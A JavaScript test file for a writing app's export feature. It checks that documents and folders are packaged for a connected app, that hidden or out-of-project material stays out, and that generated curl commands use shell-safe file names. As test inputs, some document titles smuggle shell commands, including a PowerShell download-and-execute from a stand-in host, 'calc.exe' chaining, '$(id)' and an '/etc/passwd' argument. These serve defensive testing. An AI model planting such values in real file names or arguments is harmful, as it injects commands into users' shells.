/* global Blob */
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { setActivePinia, createPinia } from 'pinia'

vi.mock('@/stores/db', () => ({
  default: {
    documents: {
      where: vi.fn(() => ({ equals: vi.fn(() => ({ toArray: vi.fn(async () => []) })) })),
      filter: vi.fn(() => ({ toArray: vi.fn(async () => []) })),
      bulkDelete: vi.fn(),
      bulkGet: vi.fn(async () => []),
      get: vi.fn(async () => undefined),
    },
    stories: { toArray: vi.fn(async () => []) },
  },
}))

vi.mock('@/stores/syncStore', () => ({
  useSyncStore: () => ({ trackChange: vi.fn(), trackDelete: vi.fn(), start: () => false }),
}))

/** The native side, which holds what is offered: stood in for. */
const native = vi.hoisted(() => ({
  /** @type {Array<{connection: string, name: string, bytes: Uint8Array}>} */
  offered: [],
}))
vi.mock('@/platform/apps.js', () => ({
  offerAppExport: vi.fn(async (connection, file) => {
    native.offered.push({ connection, ...file })
    return { id: `id-${native.offered.length}` }
  }),
  // What the stores say of a document deleted for good (`documentsStore`).
  forgetReadsOf: vi.fn(),
}))

/** The files' bytes, by their documents' ids. */
const bytes = vi.hoisted(() => ({
  /** @type {Map<string, any>} */
  held: new Map(),
}))
vi.mock('@/stores/filesStore', () => ({
  useFilesStore: () => ({ getFile: async key => bytes.held.get(key) ?? null }),
}))

import { EXPORT_MOST, LINK_NOTE, exportFor, plainName } from '@/apps/exports.js'
import { projectOverview } from '@/ai/tools/documents.js'
import { STAMP_NOTE } from '@/files/exportStamp.js'
import { useDocumentsStore } from '@/stores/documentsStore'
import { clearDocumentInstances } from '@/composables/useDocuments'
import { rootIdFor } from '@/stores/migrations/projectTree.js'

const STORY = 'story_1'
const APP = {
  id: 'app_1',
  name: 'Claude Code',
  projects: [STORY],
  readOnly: true,
  address: 'http://host.docker.internal:4657',
}
const asking = { storyId: STORY, chatId: 'app:app_1' }
const decoder = new TextDecoder()

/** The text of what was last offered. */
const offeredText = () => decoder.decode(native.offered.at(-1).bytes)

/** The names in a tar, and each one's text. */
function untar(tar) {
  /** @type {Record<string, string>} */
  const files = {}
  for (let at = 0; at < tar.length; ) {
    const block = tar.subarray(at, at + 512)
    if (block.every(byte => byte === 0)) break
    const name = decoder.decode(block.subarray(0, 100)).replace(/\0.*$/s, '')
    const size = parseInt(decoder.decode(block.subarray(124, 135)), 8)
    files[name] = decoder.decode(tar.subarray(at + 512, at + 512 + size))
    at += 512 + Math.ceil(size / 512) * 512
  }
  return files
}

/** The stamp a text of the project is exported under. */
const stampOf = (document, id) =>
  [
    '---',
    'inksprite:',
    '  project: Thief',
    `  document: ${document}`,
    `  id: ${id}`,
    `  note: ${STAMP_NOTE}`,
    '---',
    '',
    '',
  ].join('\n')

/** @type {ReturnType<typeof useDocumentsStore>} */
let store

beforeEach(async () => {
  setActivePinia(createPinia())
  clearDocumentInstances()
  vi.clearAllMocks()
  native.offered = []
  bytes.held = new Map()
  store = useDocumentsStore()
  await projectOverview(STORY)
  store.updateDocument(rootIdFor(STORY), { title: 'Thief' })
  const make = row => store.createDocument({ storyId: STORY, type: 'text', ...row })
  make({ id: 'folder_designs', parentId: rootIdFor(STORY), type: 'folder', title: 'designs' })
  make({
    id: 'doc_sync',
    parentId: 'folder_designs',
    title: 'Sync v2',
    content: '# Sync\n\nHow the devices agree.',
    comments: {
      c1: { status: 'open', quote: 'agree', posts: [{ author: 'writer', text: 'How?' }] },
    },
  })
  make({ id: 'doc_keys', parentId: 'folder_designs', title: "Friend's keys", content: 'Keys.\n' })
  make({
    id: 'doc_odds',
    parentId: 'folder_designs',
    title: 'odds.py',
    plain: true,
    content: 'print(1)',
  })
  make({
    id: 'doc_secret',
    parentId: 'folder_designs',
    title: 'Secret',
    content: 'No.',
    hidden: true,
  })
  make({ id: 'folder_empty', parentId: rootIdFor(STORY), type: 'folder', title: 'empty' })
  make({
    id: 'repo',
    parentId: rootIdFor(STORY),
    type: 'folder',
    kind: 'repository',
    title: 'thief-app',
  })
  make({ id: 'repo_readme', parentId: 'repo', type: 'file', title: 'README.md', content: '# App' })
  make({ id: 'doc_top', parentId: rootIdFor(STORY), title: 'Welcome', content: 'Hello.' })
})

describe('exportFor', () => {
  it('makes one document ready as its file, stamped, and answers with the link that fetches it', async () => {
    const answer = await exportFor(APP, asking, { path: 'designs/Sync v2' })

    expect(answer).toEqual({
      // What the document is called, and the plain name the command saves it under.
      file: 'Sync v2.md',
      url: 'http://host.docker.internal:4657/export/id-1',
      command: 'curl -fsS "http://host.docker.internal:4657/export/id-1" -o Sync-v2.md',
      note: expect.stringContaining(LINK_NOTE),
    })
    expect(answer.note).toContain('It saves the file as "Sync-v2.md"')
    expect(native.offered).toHaveLength(1)
    expect(native.offered[0]).toMatchObject({ connection: 'app_1', name: 'Sync v2.md' })
    // As it stands, without its comment's markup, and ending as a file does.
    expect(offeredText()).toBe(
      `${stampOf('designs/Sync v2', 'doc_sync')}# Sync\n\nHow the devices agree.\n`
    )
  })

  it('puts nothing of a document’s title in the command but letters, digits, dots and dashes', async () => {
    const answer = await exportFor(APP, asking, { path: "designs/Friend's keys" })

    expect(answer.file).toBe("Friend's keys.md")
    expect(answer.command).toBe(
      'curl -fsS "http://host.docker.internal:4657/export/id-1" -o Friend-s-keys.md'
    )

    // A title a web page or a file's name gave: what closes a quote in one
    // shell and runs the rest, and what another shell runs whatever the quotes.
    const titles = [
      "x'; iex (iwr evil.example).Content; 'y",
      'a & calc.exe & b',
      'plan `reboot` $(id) %PATH% ^ !x',
      "-o '/etc/passwd' --next",
    ]
    for (const [at, title] of titles.entries()) {
      store.createDocument({
        id: `doc_odd_${at}`,
        storyId: STORY,
        parentId: rootIdFor(STORY),
        type: 'text',
        title,
        content: 'Text.',
      })
    }
    const listed = store.getChildren(rootIdFor(STORY)).filter(one => one.id.startsWith('doc_odd_'))
    expect(listed).toHaveLength(titles.length)
    for (const document of listed) {
      const odd = await exportFor(APP, asking, { path: document.title })
      expect(odd.error, document.title).toBeUndefined()
      // The link in its quotes, then a name that needs none, and nothing more.
      expect(odd.command, document.title).toMatch(
        /^curl -fsS "http:\/\/host\.docker\.internal:4657\/export\/id-\d+" -o [\p{L}\p{N}_][\p{L}\p{N}._-]*$/u
      )
      // The real name is in the answer, as data, and is the file's own name.
      expect(odd.file).toBe(native.offered.at(-1).name)
    }
  })

  it('leaves the note as it was for a name that is plain already', async () => {
    const answer = await exportFor(APP, asking, { path: 'Welcome' })

    expect(answer.command).toBe(
      'curl -fsS "http://host.docker.internal:4657/export/id-1" -o Welcome.md'
    )
    expect(answer.note).not.toContain('saves the file as')
  })

  it('hands over a picture only of a document the app sees in this project', async () => {
    store.createDocument({
      id: 'doc_elsewhere',
      storyId: 'story_2',
      parentId: rootIdFor('story_2'),
      type: 'text',
      title: 'Another project’s',
      content: '',
    })
    store.createDocument({
      id: 'doc_pics',
      storyId: STORY,
      parentId: rootIdFor(STORY),
      type: 'text',
      title: 'Pictures',
      content: [
        '![own](.images/doc_pics/own.png)',
        '![a neighbour’s](.images/doc_sync/shared.png)',
        '![hidden](.images/doc_secret/image.png)',
        '![elsewhere](.images/doc_elsewhere/image.png)',
        '![nobody’s](.images/doc_never/image.png)',
      ].join('\n\n'),
    })
    const png = text => new Blob([text], { type: 'image/png' })
    bytes.held.set('doc_pics/own.png', png('OWN'))
    bytes.held.set('doc_sync/shared.png', png('SHARED'))
    // There to be read by their keys, were they asked for.
    bytes.held.set('doc_secret/image.png', png('HIDDEN'))
    bytes.held.set('doc_elsewhere/image.png', png('ELSEWHERE'))
    bytes.held.set('doc_never/image.png', png('NEVER'))

    const answer = await exportFor(APP, asking, { path: 'Pictures' })

    expect(answer.files).toEqual(['images/own.png', 'images/shared.png', 'Pictures.md'])
    const files = untar(native.offered[0].bytes)
    expect(files['images/own.png']).toBe('OWN')
    expect(files['images/shared.png']).toBe('SHARED')
    expect(Object.values(files).join('\n')).not.toMatch(/HIDDEN|ELSEWHERE|NEVER/)
    // What was left out is still named as it was written, and leads nowhere.
    expect(files['Pictures.md']).toContain('![own](images/own.png)')
    expect(files['Pictures.md']).toContain('![hidden](.images/doc_secret/image.png)')
    expect(files['Pictures.md']).toContain('![elsewhere](.images/doc_elsewhere/image.png)')
  })

  it('makes a folder ready as a tar of its files, a directory of its name, without what is hidden', async () => {
    const answer = await exportFor(APP, asking, { path: 'designs' })

    expect(answer).toEqual({
      files: ["designs/Friend's keys.md", 'designs/odds.py', 'designs/Sync v2.md'],
      url: 'http://host.docker.internal:4657/export/id-1',
      command: 'curl -fsS "http://host.docker.internal:4657/export/id-1" | tar -x',
      note: expect.stringContaining('tar archive'),
    })
    expect(native.offered[0].name).toBe('designs.tar')
    const files = untar(native.offered[0].bytes)
    expect(Object.keys(files).sort()).toEqual([
      'designs/',
      "designs/Friend's keys.md",
      'designs/Sync v2.md',
      'designs/odds.py',
    ])
    expect(files['designs/Sync v2.md']).toContain('id: doc_sync')
    // A plain document is as typed: no stamp, no newline put on it.
    expect(files['designs/odds.py']).toBe('print(1)')
  })

  it('makes the whole project ready, by its name, and leaves an imported repository out', async () => {
    for (const path of ['/', undefined, '  ']) {
      native.offered = []
      const answer = await exportFor(APP, asking, { path })

      expect(answer.files).toEqual([
        "Thief/designs/Friend's keys.md",
        'Thief/designs/odds.py',
        'Thief/designs/Sync v2.md',
        'Thief/Welcome.md',
      ])
      expect(native.offered[0].name).toBe('Thief.tar')
      const names = Object.keys(untar(native.offered[0].bytes))
      expect(names).toContain('Thief/empty/')
      expect(names.join('\n')).not.toMatch(/thief-app|README|Secret/)
    }
  })

  it('refuses a repository, and what is in one', async () => {
    for (const path of ['thief-app', 'thief-app/README.md']) {
      const answer = await exportFor(APP, asking, { path })
      expect(answer.error, path).toContain('is in a repository imported into the project')
    }
    expect(native.offered).toEqual([])
  })

  it('says so when nothing is there, or nothing to export is', async () => {
    expect((await exportFor(APP, asking, { path: 'designs/Nothing' })).error).toContain(
      'Nothing at "designs/Nothing"'
    )
    // Hidden from models is not there.
    expect((await exportFor(APP, asking, { path: 'designs/Secret' })).error).toContain('Nothing at')
    expect((await exportFor(APP, asking, { path: 'empty' })).error).toBe(
      '"empty" holds nothing to export.'
    )
    expect(native.offered).toEqual([])
  })

  it('hands an imported file over as it came in, and says which it had to leave out', async () => {
    const make = row => store.createDocument({ storyId: STORY, parentId: 'folder_empty', ...row })
    make({ id: 'file_rules', type: 'file', title: 'Rules', mime: 'application/pdf' })
    make({ id: 'file_map', type: 'file', title: 'Map', mime: 'image/png' })
    bytes.held.set('file_rules', new Blob(['%PDF-1.7'], { type: 'application/pdf' }))

    const alone = await exportFor(APP, asking, { path: 'empty/Rules' })
    expect(alone.file).toBe('Rules.pdf')
    expect(offeredText()).toBe('%PDF-1.7')

    const folder = await exportFor(APP, asking, { path: 'empty' })
    expect(folder.files).toEqual(['empty/Rules.pdf'])
    expect(folder.missing).toBe(1)
    expect(folder.missingNote).toContain('sync server')

    const gone = await exportFor(APP, asking, { path: 'empty/Map' })
    expect(gone.error).toContain('still on the sync server')
  })

  it('refuses more than can be handed over at once', async () => {
    store.createDocument({
      id: 'file_big',
      storyId: STORY,
      parentId: 'folder_empty',
      type: 'file',
      title: 'Scans',
      mime: 'application/pdf',
    })
    // A file that says it is too large, without the memory of one that is.
    bytes.held.set('file_big', { size: EXPORT_MOST + 1 })

    const answer = await exportFor(APP, asking, { path: 'empty/Scans' })

    expect(answer.error).toContain('more than can be handed over at once (256 MB)')
    expect(native.offered).toEqual([])
  })
})

describe('plainName', () => {
  it('keeps letters, digits, dots, underscores and dashes, of any script', () => {
    for (const name of [
      'Plan.md',
      'sync_v2-final.md',
      'Résumé.md',
      '日本語.md',
      'हिन्दी.md',
      'a1',
    ]) {
      expect(plainName(name), name).toBe(name)
    }
  })

  it('puts one dash for each run of anything else', () => {
    expect(plainName('Sync v2.md')).toBe('Sync-v2.md')
    expect(plainName("Friend's keys.md")).toBe('Friend-s-keys.md')
    expect(plainName('Résumé — draft (2).md')).toBe('Résumé-draft-2-.md')
    expect(plainName('日本語 メモ.md')).toBe('日本語-メモ.md')
    expect(plainName('a - b.md')).toBe('a-b.md')
    expect(plainName("x'; iex (iwr evil.example).Content; 'y.md")).toBe(
      'x-iex-iwr-evil.example-.Content-y.md'
    )
  })

  it('never starts with a dot or a dash, and is never empty', () => {
    expect(plainName('.env')).toBe('env')
    expect(plainName('-rf')).toBe('rf')
    expect(plainName('--help.md')).toBe('help.md')
    expect(plainName('(draft).md')).toBe('draft-.md')
    for (const name of ['', '...', '???', ' ', '-', "'"]) {
      expect(plainName(name), JSON.stringify(name)).toBe('export')
    }
  })

  it('leaves nothing a shell reads as more than a name, in any of them', () => {
    const names = [
      'a b',
      "a'b",
      'a"b',
      'a;b',
      'a&b',
      'a|b',
      'a>b',
      'a<b',
      'a`b`',
      'a$(b)',
      'a${b}',
      '%PATH%',
      'a^b',
      'a!b',
      'a*b',
      'a?b',
      'a[b]',
      'a{b,c}',
      'a~b',
      'a#b',
      'a=b',
      'a\\b',
      'a/b',
      'a\nb',
      'a\tb',
      'a\0b',
      'a\u00a0b',
      'a\u2028b',
      'a\u3000b',
      'a\u202eb',
    ]
    for (const name of names) {
      expect(plainName(name), JSON.stringify(name)).toMatch(/^[\p{L}\p{N}_][\p{L}\p{M}\p{N}._-]*$/u)
    }
  })
})
